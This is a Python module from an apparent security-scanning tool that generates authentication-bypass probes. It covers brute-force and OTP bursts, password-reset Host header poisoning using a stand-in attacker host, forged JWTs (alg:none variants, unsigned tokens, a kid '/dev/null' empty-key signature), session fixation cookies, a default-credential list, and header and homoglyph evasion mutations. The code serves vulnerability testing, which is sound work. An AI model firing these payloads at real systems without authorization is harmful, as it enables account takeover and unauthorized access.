"""auth_bypass: Payload generation."""
from __future__ import annotations

import copy
import hashlib
import hmac
import json
import time
import urllib.parse
import uuid
from typing import List, Optional, Tuple, Union

from argus.collectors.auth_bypass.models import AuthBypassProbe, AuthMutationStrategy, AuthVulnerabilityType


class AuthBypassPayloadGenerator:
    """
    Synthesizes targeted authentication bypass probes, session manipulation vectors,
    default credential pairs, and adversarial evasion payloads across all 6 detection modes.
    """

    # Curated default credential dictionary
    DEFAULT_CREDENTIALS_MAP: List[Tuple[str, str, str]] = [
        ("admin", "admin", "Generic Web Admin"),
        ("admin", "password", "Generic Web Admin"),
        ("admin", "123456", "Generic Web Admin"),
        ("admin", "admin123", "Generic Web Admin"),
        ("root", "root", "Generic Root"),
        ("root", "toor", "Generic Root"),
        ("administrator", "administrator", "Windows/Generic Admin"),
        ("tomcat", "s3cret", "Apache Tomcat"),
        ("tomcat", "tomcat", "Apache Tomcat"),
        ("kibana", "kibana", "Elasticsearch / Kibana"),
        ("elastic", "changeme", "Elasticsearch"),
        ("grafana", "admin", "Grafana"),
        ("jenkins", "jenkins", "Jenkins CI"),
        ("spring", "spring", "Spring Boot Actuator"),
        ("actuator", "actuator", "Spring Boot Actuator"),
    ]

    def __init__(self) -> None:
        self._counter = 0

    def generate_canary(self, prefix: str = "ARGUS_AUTH") -> str:
        """Generates a unique traceable canary token for auth validation."""
        self._counter += 1
        return f"{prefix}_{int(time.time())}_{self._counter}_{uuid.uuid4().hex[:8]}"

    def generate_benign_baseline_probes(self, endpoint_url: str) -> List[AuthBypassProbe]:
        """Generates baseline requests to capture standard unauthenticated/benign behavior."""
        return [
            AuthBypassProbe(
                probe_id=f"probe_baseline_get_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="GET",
                vulnerability_type=AuthVulnerabilityType.BRUTE_FORCE,
                strategy=AuthMutationStrategy.STANDARD,
                is_benign=True,
                metadata={"description": "Benign GET baseline request"},
            ),
            AuthBypassProbe(
                probe_id=f"probe_baseline_post_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=AuthVulnerabilityType.BRUTE_FORCE,
                strategy=AuthMutationStrategy.STANDARD,
                json_data={"username": "argus_benign_user", "password": "argus_benign_password"},
                is_benign=True,
                metadata={"description": "Benign POST baseline request with non-existent credentials"},
            ),
        ]

    # -------------------------------------------------------------------------
    # Detection Mode 1: Brute Force & Account Lockout
    # -------------------------------------------------------------------------
    def generate_brute_force_probes(self, endpoint_url: str) -> List[AuthBypassProbe]:
        """Generates probe sequences to test missing account lockout, CAPTCHA, and timing leaks."""
        probes = []
        canary_user = f"user_{uuid.uuid4().hex[:6]}"

        # Burst login probe to detect missing account lockout
        probes.append(
            AuthBypassProbe(
                probe_id=f"probe_bf_burst_lockout_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=AuthVulnerabilityType.BRUTE_FORCE,
                strategy=AuthMutationStrategy.STANDARD,
                json_data={"username": "admin", "password": "InvalidPassword123!"},
                burst_count=10,
                tested_parameter="password",
                metadata={"technique": "account_lockout_missing", "target_username": "admin"},
            )
        )

        # Non-existent user probe for timing/enumeration differential comparison
        probes.append(
            AuthBypassProbe(
                probe_id=f"probe_bf_enum_timing_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=AuthVulnerabilityType.BRUTE_FORCE,
                strategy=AuthMutationStrategy.STANDARD,
                json_data={"username": canary_user, "password": "InvalidPassword123!"},
                burst_count=5,
                tested_parameter="username",
                metadata={"technique": "username_enumeration_timing", "invalid_username": canary_user},
            )
        )
        return probes

    # -------------------------------------------------------------------------
    # Detection Mode 2: Password Reset Abuse
    # -------------------------------------------------------------------------
    def generate_password_reset_probes(self, endpoint_url: str) -> List[AuthBypassProbe]:
        """Generates password reset vulnerability probes (Host header poisoning, token reuse)."""
        probes = []
        poisoned_host = "attacker-controlled-argus.evil"

        # Host / X-Forwarded-Host injection
        for header_name in ["Host", "X-Forwarded-Host", "X-Forwarded-Server", "X-Host"]:
            probes.append(
                AuthBypassProbe(
                    probe_id=f"probe_pwd_reset_host_{header_name.lower().replace('-', '_')}_{uuid.uuid4().hex[:6]}",
                    target_url=endpoint_url,
                    method="POST",
                    vulnerability_type=AuthVulnerabilityType.PASSWORD_RESET,
                    strategy=AuthMutationStrategy.AUTH_HEADER_MANIPULATION,
                    headers={header_name: poisoned_host},
                    json_data={"email": "victim@example.com", "username": "victim"},
                    tested_parameter=header_name,
                    tampered_value=poisoned_host,
                    metadata={"technique": "password_reset_host_injection", "poisoned_host": poisoned_host},
                )
            )

        # Reset token reuse simulation probe
        dummy_token = f"tok_reset_{uuid.uuid4().hex}"
        probes.append(
            AuthBypassProbe(
                probe_id=f"probe_pwd_reset_token_reuse_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=AuthVulnerabilityType.PASSWORD_RESET,
                strategy=AuthMutationStrategy.STANDARD,
                json_data={"token": dummy_token, "new_password": "NewSecretPassword123!"},
                tested_parameter="token",
                metadata={"technique": "reset_token_reuse", "token": dummy_token},
            )
        )
        return probes

    # -------------------------------------------------------------------------
    # Detection Mode 3: MFA / 2FA Bypass
    # -------------------------------------------------------------------------
    def generate_mfa_bypass_probes(self, endpoint_url: str) -> List[AuthBypassProbe]:
        """Generates MFA bypass probes (direct browsing, response manipulation, parameter omission)."""
        probes = []

        # Forced browsing / direct access with Phase 1 session
        probes.append(
            AuthBypassProbe(
                probe_id=f"probe_mfa_forced_browsing_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="GET",
                vulnerability_type=AuthVulnerabilityType.MFA_BYPASS,
                strategy=AuthMutationStrategy.STANDARD,
                headers={"Authorization": "Bearer mfa_phase1_intermediate_token"},
                tested_parameter="Authorization",
                metadata={"technique": "mfa_forced_browsing"},
            )
        )

        # Parameter omission & state injection (omitting OTP code or asserting mfa_completed)
        probes.append(
            AuthBypassProbe(
                probe_id=f"probe_mfa_param_omission_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=AuthVulnerabilityType.MFA_BYPASS,
                strategy=AuthMutationStrategy.STANDARD,
                json_data={"skip_mfa": True, "mfa_completed": 1, "otp": None},
                tested_parameter="skip_mfa",
                metadata={"technique": "missing_mfa_enforcement"},
            )
        )

        # Unthrottled OTP Brute Force burst
        probes.append(
            AuthBypassProbe(
                probe_id=f"probe_mfa_otp_brute_force_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=AuthVulnerabilityType.MFA_BYPASS,
                strategy=AuthMutationStrategy.STANDARD,
                json_data={"code": "000000"},
                burst_count=15,
                tested_parameter="code",
                metadata={"technique": "unthrottled_otp_brute_force"},
            )
        )
        return probes

    # -------------------------------------------------------------------------
    # Detection Mode 4: Session Fixation
    # -------------------------------------------------------------------------
    def generate_session_fixation_probes(self, endpoint_url: str) -> List[AuthBypassProbe]:
        """Generates session fixation verification probes."""
        preset_session_id = f"sess_fixed_{uuid.uuid4().hex[:16]}"
        return [
            AuthBypassProbe(
                probe_id=f"probe_session_fixation_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=AuthVulnerabilityType.SESSION_FIXATION,
                strategy=AuthMutationStrategy.STANDARD,
                headers={"Cookie": f"session={preset_session_id}; JSESSIONID={preset_session_id}"},
                json_data={"username": "admin", "password": "admin_password"},
                tested_parameter="Cookie",
                tampered_value=preset_session_id,
                metadata={"technique": "session_fixation", "preset_session_id": preset_session_id},
            )
        ]

    # -------------------------------------------------------------------------
    # Detection Mode 5: JWT Manipulation & Key Confusion
    # -------------------------------------------------------------------------
    def generate_jwt_manipulation_probes(
        self, endpoint_url: str, sample_jwt: Optional[str] = None
    ) -> List[AuthBypassProbe]:
        """Generates JWT manipulation probes (alg:none, missing signature, header injection)."""
        probes = []

        def b64url(s: str) -> str:
            import base64
            return base64.urlsafe_b64encode(s.encode("utf-8")).decode("utf-8").rstrip("=")

        admin_payload = json.dumps({"sub": "admin", "role": "admin", "isAdmin": True, "iat": int(time.time())})
        b64_payload = b64url(admin_payload)

        # 1. alg: "none" variations
        for alg in ["none", "None", "NONE", "nOnE"]:
            b64_header = b64url(json.dumps({"alg": alg, "typ": "JWT"}))
            # Ending with dot (standard alg: none)
            token_dot = f"{b64_header}.{b64_payload}."
            # Ending without dot
            token_nodot = f"{b64_header}.{b64_payload}"

            probes.append(
                AuthBypassProbe(
                    probe_id=f"probe_jwt_alg_none_{alg}_{uuid.uuid4().hex[:6]}",
                    target_url=endpoint_url,
                    method="GET",
                    vulnerability_type=AuthVulnerabilityType.JWT_MANIPULATION,
                    strategy=AuthMutationStrategy.TOKEN_FORMAT_MANIPULATION,
                    headers={"Authorization": f"Bearer {token_dot}"},
                    tested_parameter="Authorization",
                    tampered_value=f"alg:{alg}",
                    metadata={"technique": "jwt_alg_none", "jwt": token_dot, "alg": alg},
                )
            )

        # 2. Missing signature with original header
        b64_hs_header = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}))
        token_unsigned = f"{b64_hs_header}.{b64_payload}."
        probes.append(
            AuthBypassProbe(
                probe_id=f"probe_jwt_unsigned_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="GET",
                vulnerability_type=AuthVulnerabilityType.JWT_MANIPULATION,
                strategy=AuthMutationStrategy.TOKEN_FORMAT_MANIPULATION,
                headers={"Authorization": f"Bearer {token_unsigned}"},
                tested_parameter="Authorization",
                metadata={"technique": "jwt_signature_not_verified", "jwt": token_unsigned},
            )
        )

        # 3. Expired token acceptance
        expired_payload = json.dumps({"sub": "admin", "role": "admin", "exp": int(time.time()) - 86400})
        b64_exp_payload = b64url(expired_payload)
        token_expired = f"{b64_hs_header}.{b64_exp_payload}.dummysignature"
        probes.append(
            AuthBypassProbe(
                probe_id=f"probe_jwt_expired_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="GET",
                vulnerability_type=AuthVulnerabilityType.JWT_MANIPULATION,
                strategy=AuthMutationStrategy.STANDARD,
                headers={"Authorization": f"Bearer {token_expired}"},
                tested_parameter="Authorization",
                metadata={"technique": "jwt_expired_accepted", "jwt": token_expired},
            )
        )

        # 4. Header parameter injection (kid path traversal / dev null)
        b64_kid_header = b64url(json.dumps({"alg": "HS256", "typ": "JWT", "kid": "/dev/null"}))
        sig_empty_key = hmac.new(b"", f"{b64_kid_header}.{b64_payload}".encode("utf-8"), hashlib.sha256).digest()
        import base64
        b64_sig = base64.urlsafe_b64encode(sig_empty_key).decode("utf-8").rstrip("=")
        token_kid = f"{b64_kid_header}.{b64_payload}.{b64_sig}"
        probes.append(
            AuthBypassProbe(
                probe_id=f"probe_jwt_kid_injection_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="GET",
                vulnerability_type=AuthVulnerabilityType.JWT_MANIPULATION,
                strategy=AuthMutationStrategy.STANDARD,
                headers={"Authorization": f"Bearer {token_kid}"},
                tested_parameter="kid",
                metadata={"technique": "jwt_header_injection", "jwt": token_kid},
            )
        )
        return probes

    # -------------------------------------------------------------------------
    # Detection Mode 6: Default Credentials
    # -------------------------------------------------------------------------
    def generate_default_credentials_probes(self, endpoint_url: str) -> List[AuthBypassProbe]:
        """Generates default credential probes targeting administrative portals and APIs."""
        probes = []
        import base64

        for user, pwd, service in self.DEFAULT_CREDENTIALS_MAP[:8]:
            # JSON POST probe
            probes.append(
                AuthBypassProbe(
                    probe_id=f"probe_default_cred_json_{user}_{uuid.uuid4().hex[:6]}",
                    target_url=endpoint_url,
                    method="POST",
                    vulnerability_type=AuthVulnerabilityType.DEFAULT_CREDENTIALS,
                    strategy=AuthMutationStrategy.STANDARD,
                    json_data={"username": user, "password": pwd},
                    tested_parameter="username:password",
                    metadata={"technique": "default_credentials", "username": user, "password": pwd, "service": service},
                )
            )

            # HTTP Basic Auth probe
            b64_auth = base64.b64encode(f"{user}:{pwd}".encode("utf-8")).decode("utf-8")
            probes.append(
                AuthBypassProbe(
                    probe_id=f"probe_default_cred_basic_{user}_{uuid.uuid4().hex[:6]}",
                    target_url=endpoint_url,
                    method="GET",
                    vulnerability_type=AuthVulnerabilityType.DEFAULT_CREDENTIALS,
                    strategy=AuthMutationStrategy.STANDARD,
                    headers={"Authorization": f"Basic {b64_auth}"},
                    tested_parameter="Authorization",
                    metadata={"technique": "default_credentials", "username": user, "password": pwd, "service": service},
                )
            )
        return probes

    # -------------------------------------------------------------------------
    # Detection Mode 7: Session Token Analysis & Cookie Security
    # -------------------------------------------------------------------------
    def generate_session_token_analysis_probes(self, endpoint_url: str) -> List[AuthBypassProbe]:
        """Generates probes to audit session entropy, cookie attributes, and expiration."""
        return [
            AuthBypassProbe(
                probe_id=f"probe_session_audit_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="GET",
                vulnerability_type=AuthVulnerabilityType.SESSION_TOKEN_ANALYSIS,
                strategy=AuthMutationStrategy.STANDARD,
                metadata={"technique": "session_token_analysis"},
            )
        ]

    # -------------------------------------------------------------------------
    # Detection Mode 8: Credential Stuffing Susceptibility
    # -------------------------------------------------------------------------
    def generate_credential_stuffing_probes(self, endpoint_url: str) -> List[AuthBypassProbe]:
        """Generates distributed IP simulation probes to test credential stuffing resistance."""
        return [
            AuthBypassProbe(
                probe_id=f"probe_cred_stuffing_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=AuthVulnerabilityType.CREDENTIAL_STUFFING,
                strategy=AuthMutationStrategy.AUTH_HEADER_MANIPULATION,
                json_data={"username": "victim@example.com", "password": "WrongPassword123!"},
                burst_count=10,
                tested_parameter="X-Forwarded-For",
                metadata={"technique": "credential_stuffing_susceptible"},
            )
        ]

    # -------------------------------------------------------------------------
    # Mutation & Evasion Strategies (5 Strategies)
    # -------------------------------------------------------------------------
    def apply_case_sensitivity_mutation(self, probe: AuthBypassProbe) -> AuthBypassProbe:
        """Mutates usernames, path cases, or headers to bypass case-sensitive filters."""
        mutated = copy.deepcopy(probe)
        mutated.strategy = AuthMutationStrategy.CASE_SENSITIVITY
        mutated.probe_id = f"{probe.probe_id}_case_mut"

        if isinstance(mutated.json_data, dict):
            if "username" in mutated.json_data:
                u = str(mutated.json_data["username"])
                mutated.json_data["username"] = u.capitalize() if u.islower() else u.upper()

        parsed = urllib.parse.urlparse(mutated.target_url)
        if "/admin" in parsed.path:
            new_path = parsed.path.replace("/admin", "/Admin")
            mutated.target_url = urllib.parse.urlunparse(parsed._replace(path=new_path))
        return mutated

    def apply_unicode_normalization_mutation(self, probe: AuthBypassProbe) -> AuthBypassProbe:
        """Injects Cyrillic homoglyphs or Fullwidth characters to test normalization bypasses."""
        mutated = copy.deepcopy(probe)
        mutated.strategy = AuthMutationStrategy.UNICODE_NORMALIZATION
        mutated.probe_id = f"{probe.probe_id}_unicode_mut"

        if isinstance(mutated.json_data, dict) and "username" in mutated.json_data:
            orig = str(mutated.json_data["username"])
            # Replace Latin 'a' with Cyrillic 'а' (U+0430)
            homoglyph = orig.replace("a", "\u0430").replace("o", "\u043e")
            mutated.json_data["username"] = homoglyph
            mutated.tampered_value = homoglyph
        return mutated

    def apply_auth_header_mutation(self, probe: AuthBypassProbe) -> AuthBypassProbe:
        """Injects loopback IP headers and identity override headers."""
        mutated = copy.deepcopy(probe)
        mutated.strategy = AuthMutationStrategy.AUTH_HEADER_MANIPULATION
        mutated.probe_id = f"{probe.probe_id}_hdr_mut"

        mutated.headers.update({
            "X-Forwarded-For": "127.0.0.1",
            "X-Real-IP": "127.0.0.1",
            "X-Original-URL": "/admin",
            "X-Rewrite-URL": "/admin",
            "X-Custom-IP-Authorization": "127.0.0.1",
        })
        return mutated

    def apply_token_format_mutation(self, probe: AuthBypassProbe) -> AuthBypassProbe:
        """Mutates Bearer token prefixes, whitespace, and padding."""
        mutated = copy.deepcopy(probe)
        mutated.strategy = AuthMutationStrategy.TOKEN_FORMAT_MANIPULATION
        mutated.probe_id = f"{probe.probe_id}_tok_mut"

        if "Authorization" in mutated.headers:
            val = mutated.headers["Authorization"]
            if val.startswith("Bearer "):
                tok = val[7:]
                # Double space after Bearer or lower case bearer
                mutated.headers["Authorization"] = f"bearer  {tok}"
        return mutated

    def apply_response_manipulation_mutation(self, probe: AuthBypassProbe) -> AuthBypassProbe:
        """Applies HTTP method override headers to test authorization filters."""
        mutated = copy.deepcopy(probe)
        mutated.strategy = AuthMutationStrategy.RESPONSE_MANIPULATION
        mutated.probe_id = f"{probe.probe_id}_resp_mut"

        mutated.headers["X-HTTP-Method-Override"] = "GET"
        return mutated

    def apply_mutation(
        self, probe: AuthBypassProbe, strategy: Union[AuthMutationStrategy, str]
    ) -> AuthBypassProbe:
        """Dispatches probe mutation based on strategy."""
        strat = AuthMutationStrategy(strategy) if isinstance(strategy, str) else strategy
        if strat == AuthMutationStrategy.CASE_SENSITIVITY:
            return self.apply_case_sensitivity_mutation(probe)
        elif strat == AuthMutationStrategy.UNICODE_NORMALIZATION:
            return self.apply_unicode_normalization_mutation(probe)
        elif strat == AuthMutationStrategy.AUTH_HEADER_MANIPULATION:
            return self.apply_auth_header_mutation(probe)
        elif strat == AuthMutationStrategy.TOKEN_FORMAT_MANIPULATION:
            return self.apply_token_format_mutation(probe)
        elif strat == AuthMutationStrategy.RESPONSE_MANIPULATION:
            return self.apply_response_manipulation_mutation(probe)
        return copy.deepcopy(probe)

    def generate_all_probes(self, endpoint_url: str) -> List[AuthBypassProbe]:
        """Compiles all baseline, detection mode, and mutated probes for an endpoint."""
        probes: List[AuthBypassProbe] = []

        # 1. Baselines
        probes.extend(self.generate_benign_baseline_probes(endpoint_url))

        # 2. Multi-vector Detection Modes
        probes.extend(self.generate_brute_force_probes(endpoint_url))
        probes.extend(self.generate_password_reset_probes(endpoint_url))
        probes.extend(self.generate_mfa_bypass_probes(endpoint_url))
        probes.extend(self.generate_session_fixation_probes(endpoint_url))
        probes.extend(self.generate_jwt_manipulation_probes(endpoint_url))
        probes.extend(self.generate_default_credentials_probes(endpoint_url))
        probes.extend(self.generate_session_token_analysis_probes(endpoint_url))
        probes.extend(self.generate_credential_stuffing_probes(endpoint_url))

        # 3. Apply Mutations across representative probes
        mutated_probes: List[AuthBypassProbe] = []
        for p in probes:
            if not p.is_benign and p.vulnerability_type in (
                AuthVulnerabilityType.BRUTE_FORCE,
                AuthVulnerabilityType.DEFAULT_CREDENTIALS,
                AuthVulnerabilityType.MFA_BYPASS,
            ):
                mutated_probes.append(self.apply_case_sensitivity_mutation(p))
                mutated_probes.append(self.apply_unicode_normalization_mutation(p))
                mutated_probes.append(self.apply_auth_header_mutation(p))

        probes.extend(mutated_probes)
        return probes
